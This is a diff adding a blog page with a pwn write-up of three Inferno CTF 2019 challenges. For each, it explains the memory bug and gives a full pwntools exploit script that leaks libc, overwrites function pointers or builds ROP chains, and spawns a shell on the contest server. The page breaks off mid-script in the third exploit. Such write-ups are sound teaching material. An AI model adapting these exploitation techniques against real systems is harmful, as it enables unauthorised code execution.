@@ -1,0 +1,585 @@
+<!doctype html>
+
+<html lang="en-us">
+
+<head>
+  <title>Catousify</title>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="description" content="The HTML5 Herald" />
+  <meta name="author" content="kiror0" /><meta name="generator" content="Hugo 0.62.0" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.0/normalize.min.css" />
+  <script src="https://kit.fontawesome.com/b76b73e8e8.js" crossorigin="anonymous"></script>
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto+Slab|Ruda" />
+  <link rel="stylesheet" type="text/css" href="http://zeroload.github.io/ctf/css/styles.css" /></head>
+
+<body>
+  <div id="container">
+    <header>
+      <h1>
+                <a href="http://zeroload.github.io/ctf/">Catousify</a>
+            </h1>
+
+      <ul id="social-media">
+        
+        
+          
+        <li><a href="https://github.com/kiror0"><i class="fab fa-github fa-lg" aria-hidden="true"></i></a></li>
+           
+      </ul>
+      
+      <p><em>No Clever Tagline Needed.</em></p>
+      
+    </header>
+
+    
+<nav>
+    <ul>
+        
+        <li>
+            <a class="" href="http://zeroload.github.io/ctf/posts/">
+                <i class="fa-li fa  fa-lg"></i><span>Posts</span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="" href="http://zeroload.github.io/ctf/about/">
+                <i class="fa-li fa  fa-lg"></i><span>About Me</span>
+            </a>
+        </li>
+        
+    </ul>
+</nav>
+
+    <main>
+
+
+
+
+<article>
+
+    <h1>Inferno CTF 2019 - pwn Write Up</h1>
+
+    
+        <aside>
+    <ul>
+        <li>
+            <time class="post-date" datetime="2019-12-30T00:00:00Z">Dec 30, 2019</time>
+        </li>
+        
+        <li>
+            Categories:
+            <em>
+                
+                    
+                    <a href="http://zeroload.github.io/ctf/categories/rev">rev</a>
+                
+                    , 
+                    <a href="http://zeroload.github.io/ctf/categories/writeup">writeup</a>
+                
+            </em>
+        </li>
+        
+
+        
+
+        <li>9 minutes read</li>
+    </ul>
+</aside>
+
+    
+
+    <h2 id="bookstore">bookstore</h2>
+<pre><code>Description : I've been fascinated by the Earthsea Quartet since I was a child, so I would like I opened a bookstore to share Ursula Le Guin's with y'all. Care to have a look around?
+server: nc 130.211.214.112 18012
+file: bookstore
+</code></pre><p><img src="http://zeroload.github.io/ctf/img/inferno/bookstore1.png#mid" alt=""></p>
+<p>I turned ASLR off when debugging, so that I could find address of <code>v5</code> easily. The only tricky part was finding which input could corrupt <code>v5</code> without any other function messing with our crafted input. After some debugging session, it turns out <code>puts</code> mess up the stack too much (<code>puts</code> is called every loop in main at <code>sub_40178B</code>).</p>
+<p><img src="http://zeroload.github.io/ctf/img/inferno/bookstore2.png#float-right" alt=""></p>
+<p>That means, the only way I could forge my pointer is on <code>sub_40122D()</code> calls right after the menu printed. Luckyly, the buffer to be passed into <code>atoi</code> is overlapping with <code>v5</code> later while adding a book to collection.</p>
+<p><em>TL;DR</em>, uninitialized variable</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#75715e">#!/usr/bin/env python</span>
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+<span style="color:#75715e"># context.arch = &#34;amd64&#34;</span>
+context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">debug</span><span style="color:#e6db74">&#34;</span> <span style="color:#75715e"># debug, info, warn</span>
+context<span style="color:#f92672">.</span>terminal <span style="color:#f92672">=</span> [<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">tmux</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">splitw</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">-h</span><span style="color:#e6db74">&#34;</span>]
+
+BINARY <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">./bookstore</span><span style="color:#e6db74">&#34;</span>
+HOST <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">130.211.214.112</span><span style="color:#e6db74">&#34;</span>
+PORT <span style="color:#f92672">=</span> <span style="color:#ae81ff">18012</span>
+
+<span style="color:#75715e"># elf = ELF(BINARY, checksec=False)</span>
+uu64 <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x: u64(x<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>))
+uu32 <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x: u32(x<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">4</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>))
+
+gdbscript <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#e6db74">
+</span><span style="color:#e6db74"></span><span style="color:#e6db74">b *0x4018A3</span><span style="color:#e6db74">
+</span><span style="color:#e6db74"></span><span style="color:#e6db74">b *0x401370</span><span style="color:#e6db74">
+</span><span style="color:#e6db74"></span><span style="color:#e6db74">b *0x40144B</span><span style="color:#e6db74">
+</span><span style="color:#e6db74"></span><span style="color:#e6db74"># b *0x401250</span><span style="color:#e6db74">
+</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#39;&#39;&#39;</span>
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">attach</span>(r):
+    <span style="color:#66d9ef">if</span> type(r) <span style="color:#f92672">==</span> process:
+        gdb<span style="color:#f92672">.</span>attach(r, gdbscript)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">add</span>(name, year, target):
+    r<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74"> : </span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">1</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>) <span style="color:#f92672">+</span> p64(target))
+    r<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">? </span><span style="color:#e6db74">&#39;</span>, name)
+    r<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">? </span><span style="color:#e6db74">&#39;</span>, str(year))
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">delete</span>(name, year, idx):
+    r<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74"> : </span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">2</span><span style="color:#e6db74">&#39;</span>)
+    r<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">? </span><span style="color:#e6db74">&#39;</span>, name)
+    r<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">? </span><span style="color:#e6db74">&#39;</span>, str(year))
+    r<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">? </span><span style="color:#e6db74">&#39;</span>, str(idx))
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">update</span>(name, year, desc<span style="color:#f92672">=</span>None):
+    r<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74"> : </span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">3</span><span style="color:#e6db74">&#39;</span>)
+    r<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">? </span><span style="color:#e6db74">&#39;</span>, name)
+    r<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">? </span><span style="color:#e6db74">&#39;</span>, str(year))
+    <span style="color:#66d9ef">if</span> desc <span style="color:#f92672">!=</span> None:
+        r<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">: </span><span style="color:#e6db74">&#39;</span>, desc)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">show</span>():
+    r<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74"> : </span><span style="color:#e6db74">&#39;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">4</span><span style="color:#e6db74">&#39;</span>)
+    res <span style="color:#f92672">=</span> []
+    r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74"> 0 : </span><span style="color:#e6db74">&#39;</span>, <span style="color:#ae81ff">1</span>)
+    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">20</span>):
+        res<span style="color:#f92672">.</span>append(r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">{:2d} : </span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>format(i), <span style="color:#ae81ff">1</span>)<span style="color:#f92672">.</span>split(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">     </span><span style="color:#e6db74">&#39;</span>))
+    res<span style="color:#f92672">.</span>append(r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">           Action List</span><span style="color:#e6db74">&#39;</span>, <span style="color:#ae81ff">1</span>)<span style="color:#f92672">.</span>split(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">     </span><span style="color:#e6db74">&#39;</span>))
+    <span style="color:#66d9ef">return</span> res
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exploit</span>():
+    attach(r)
+    add(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">circleous</span><span style="color:#e6db74">&#39;</span>, <span style="color:#ae81ff">0x1337</span>, <span style="color:#ae81ff">0x403fb0</span>)
+    res <span style="color:#f92672">=</span> show()
+    leak <span style="color:#f92672">=</span> res[<span style="color:#ae81ff">0</span>][<span style="color:#ae81ff">2</span>]
+    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">puts </span><span style="color:#e6db74">%x</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> uu64(leak))
+    libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> uu64(leak) <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">puts</span><span style="color:#e6db74">&#39;</span>]
+    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">libc </span><span style="color:#e6db74">%x</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">%</span> libc<span style="color:#f92672">.</span>address)
+
+    payload <span style="color:#f92672">=</span> p64(libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">puts</span><span style="color:#e6db74">&#39;</span>])
+    payload<span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">system</span><span style="color:#e6db74">&#39;</span>])
+    update(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>, <span style="color:#ae81ff">0</span>, payload) <span style="color:#75715e"># override strlen()</span>
+    
+    add(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>, <span style="color:#ae81ff">123</span>, <span style="color:#ae81ff">0</span>)
+
+<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">__main__</span><span style="color:#e6db74">&#39;</span>:
+    <span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">1</span>:
+        r <span style="color:#f92672">=</span> remote(HOST, PORT)
+        libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">./libc64_2.29.so</span><span style="color:#e6db74">&#39;</span>, checksec<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>)
+    <span style="color:#66d9ef">else</span>:
+        r <span style="color:#f92672">=</span> process(BINARY, aslr<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>)
+        libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">/opt/glibc/x64/2.29/lib/libc.so.6</span><span style="color:#e6db74">&#39;</span>, checksec<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>)
+
+    exploit()
+    r<span style="color:#f92672">.</span>interactive()
+</code></pre></div><h2 id="treat">treat</h2>
+<pre><code>Description: We sell all kinds of treat here, would you care to try our flagship coffee? p.s. It is not only delicious, but also environment friendly.
+server: nc 130.211.214.112 18010
+file: treat
+</code></pre><p><img src="http://zeroload.github.io/ctf/img/inferno/treat1.png" alt=""></p>
+<p>Buffer overflow with a twist, <code>\x00</code> or <code>\n</code> as the end of input and the buffer is padded with zeroes to next multiply of 8. <code>\x00</code> as end of input is limiting us to place input as pointer once at a time since the pointer is 64bit wide and it'll obviously contains null byte since the pointer isn't really taking all the 64bit space.
+The trick is you could forge ROP backward instead of the usual <code>p64(poprdi)+p64(binsh)+p64(system)</code> and placing a pointer once at a time every user input.</p>
+<p>kinda Visualized,</p>
+<pre><code>&quot;A&quot; * 0x28 + p64(0xdeadbeef)
+00000000  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
+00000010  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
+00000020  41 41 41 41 41 41 41 41  00 00 00 00 de ad be ef  |AAAAAAAA........|
+</code></pre><pre><code>&quot;A&quot; * 0x20 + p64(0x13371337)
+00000000  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
+00000010  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  |AAAAAAAAAAAAAAAA|
+00000020  00 00 00 00 13 37 13 37  00 00 00 00 de ad be ef  |................|
+</code></pre><p>&hellip; and so on, the full exploit,</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+context<span style="color:#f92672">.</span>terminal <span style="color:#f92672">=</span> [<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">tmux</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">splitw</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">-h</span><span style="color:#e6db74">&#34;</span>]
+context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">debug</span><span style="color:#e6db74">&#34;</span> <span style="color:#75715e"># debug, info, warn</span>
+
+
+exe <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">treat</span><span style="color:#e6db74">&#34;</span>)
+p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">130.211.214.112</span><span style="color:#e6db74">&#39;</span> ,<span style="color:#ae81ff">18010</span>)
+<span style="color:#75715e"># p = process(&#39;./treat&#39;)</span>
+
+<span style="color:#75715e">### stack pivot, prepare rbp at bss+0x7B0</span>
+
+p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">: </span><span style="color:#e6db74">&#39;</span>,  <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">AAAA</span><span style="color:#e6db74">&#39;</span>)
+
+junk <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">1</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">72</span>
+junk <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0x4012c8</span>)[:<span style="color:#ae81ff">3</span>] <span style="color:#75715e"># main+4</span>
+p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">: </span><span style="color:#e6db74">&#39;</span>, junk)
+
+junk <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">1</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">64</span>
+junk <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0x405810</span>)[:<span style="color:#ae81ff">3</span>] <span style="color:#75715e"># rbp</span>
+p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">: </span><span style="color:#e6db74">&#39;</span>, junk)
+
+<span style="color:#75715e">### ROP to system(&#34;/bin/sh&#34;)</span>
+
+junk <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">/bin/sh;</span><span style="color:#e6db74">&#39;</span>
+junk <span style="color:#f92672">+</span><span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">A</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x7a0</span>
+junk <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p32(exe<span style="color:#f92672">.</span>plt[<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">system</span><span style="color:#e6db74">&#39;</span>])[:<span style="color:#ae81ff">3</span>] <span style="color:#75715e"># system(&#34;/bin/sh;AAAA...&#34;)</span>
+p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">: </span><span style="color:#e6db74">&#39;</span>, junk)
+
+junk <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">1</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x50</span>
+junk <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0x405080</span>)[:<span style="color:#ae81ff">3</span>] <span style="color:#75715e"># &#34;/bin/sh;&#34; from name</span>
+p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">: </span><span style="color:#e6db74">&#39;</span>, junk)
+
+junk <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">1</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x48</span>
+junk <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0x4016a3</span>)[:<span style="color:#ae81ff">3</span>] <span style="color:#75715e"># pop rdi; ret</span>
+p<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">: </span><span style="color:#e6db74">&#39;</span>, junk)
+
+p<span style="color:#f92672">.</span>interactive()
+</code></pre></div><h2 id="helloworld">helloworld</h2>
+<pre><code>Description: A simple AI to greet the customers :chuckles:
+server: nc 130.211.214.112 18016
+file: ld.so, libc.so, helloworld
+</code></pre><p><img src="http://zeroload.github.io/ctf/img/inferno/helloworld1.png#float-right" alt=""></p>
+<p>2 shot try format string with <code>exit(0)</code> at the end. Given ld.so and libc.so and if you've solved <code>3x17</code> from <a href="https://pwnable.tw/">pwnable.tw</a>, you should know where this challange will go. Here, there's another bug that could be used. Did you notice the <code>i</code> in for loop is signed? You coud change this to some negative number and gain more loop to format string. Then change <code>__free_hook</code> or <code>__malloc_hook</code> to <code>one_gadget</code> and call <code>printf(&quot;%65537c&quot;)</code> to get <code>malloc</code>/<code>free</code> called, <a href="https://code.woboq.org/userspace/glibc/stdio-common/vfprintf-internal.c.html#1665">more info about this</a>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#75715e">#!/usr/bin/env python</span>
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+<span style="color:#75715e"># context.arch = &#34;amd64&#34;</span>
+<span style="color:#75715e"># context.log_level = &#34;debug&#34; # debug, info, warn</span>
+context<span style="color:#f92672">.</span>terminal <span style="color:#f92672">=</span> [<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">tmux</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">splitw</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">-h</span><span style="color:#e6db74">&#34;</span>]
+
+BINARY <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">./helloworld</span><span style="color:#e6db74">&#34;</span>
+HOST <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">130.211.214.112</span><span style="color:#e6db74">&#34;</span>
+PORT <span style="color:#f92672">=</span> <span style="color:#ae81ff">18016</span>
+
+<span style="color:#75715e"># elf = ELF(BINARY, checksec=False)</span>
+uu64 <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x: u64(x<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>))
+uu32 <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x: u32(x<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">4</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>))
+
+gdbscript <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#e6db74">
+</span><span style="color:#e6db74"></span><span style="color:#e6db74">brva 0x127D</span><span style="color:#e6db74">
+</span><span style="color:#e6db74"></span><span style="color:#e6db74">&#39;&#39;&#39;</span>
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">hex2int</span>(x):
+    <span style="color:#66d9ef">return</span> int(x, <span style="color:#ae81ff">16</span>)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">attach</span>(r):
+    <span style="color:#66d9ef">if</span> type(r) <span style="color:#f92672">==</span> process:
+        gdb<span style="color:#f92672">.</span>attach(r, gdbscript)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">write8</span>(addr, n):
+    payload <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">%</span><span style="color:#e6db74">{}c</span><span style="color:#e6db74">%</span><span style="color:#e6db74">11$hhn</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>format((n <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFF</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x100</span>)
+    payload <span style="color:#f92672">=</span> payload<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">0x18</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">A</span><span style="color:#e6db74">&#39;</span>)
+    payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(addr)
+    r<span style="color:#f92672">.</span>send(payload)
+    r<span style="color:#f92672">.</span>recv()
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">write16</span>(addr, n):
+    payload <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">%</span><span style="color:#e6db74">{}c</span><span style="color:#e6db74">%</span><span style="color:#e6db74">11$hhn</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>format((n <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFF</span>) <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10000</span>)
+    payload <span style="color:#f92672">=</span> payload<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">0x18</span>, <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">A</span><span style="color:#e6db74">&#39;</span>)
+    payload <span style="color:#f92672">+</span><span style="color:#f92672">=</span> p64(addr)
+    r<span style="color:#f92672">.</span>send(payload)
+    r<span style="color:#f92672">.</span>recv()
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">write64</span>(addr, n, b<span style="color:#f92672">=</span><span style="color:#ae81ff">8</span>):
+    <span style="color:#66d9ef">if</span> b <span style="color:#f92672">==</span> <span style="color:#ae81ff">8</span>:
+        <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">8</span>):
+            write8(addr, n)
+            n <span style="color:#f92672">&gt;&gt;</span><span style="color:#f92672">=</span> <span style="color:#ae81ff">8</span>
+            addr <span style="color:#f92672">+</span><span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
+    <span style="color:#66d9ef">elif</span> b <span style="color:#f92672">==</span> <span style="color:#ae81ff">16</span>:
+        <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">64</span><span style="color:#f92672">/</span><span style="color:#ae81ff">16</span>):
+            write16(addr, n)
+            n <span style="color:#f92672">&gt;&gt;</span><span style="color:#f92672">=</span> <span style="color:#ae81ff">16</span>
+            addr <span style="color:#f92672">+</span><span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exploit</span>():
+    payload  <span style="color:#f92672">=</span> <span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">%</span><span style="color:#e6db74">12$p;</span><span style="color:#e6db74">%</span><span style="color:#e6db74">14$p;</span><span style="color:#e6db74">%</span><span style="color:#e6db74">15$p</span><span style="color:#ae81ff">\n</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>
+    r<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">? </span><span style="color:#e6db74">&#39;</span>, payload)
+    r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">, </span><span style="color:#e6db74">&#39;</span>)
+    
+    stack, pie, __libc_start_main_ret <span style="color:#f92672">=</span> map(hex2int, r<span style="color:#f92672">.</span>recvline(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">.</span>split(<span style="color:#e6db74"></span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">;</span><span style="color:#e6db74">&#39;</span>))
+    stack <span style="color:#f92672">-</span><span style="color:#f92672">=</span> <span style="color:#ae81ff">0x114</span>
+    pie <span style="color:#f92672">-</span><span style="color:#f92672">=</span> <span style="color:#ae81ff">0x12b0</span>
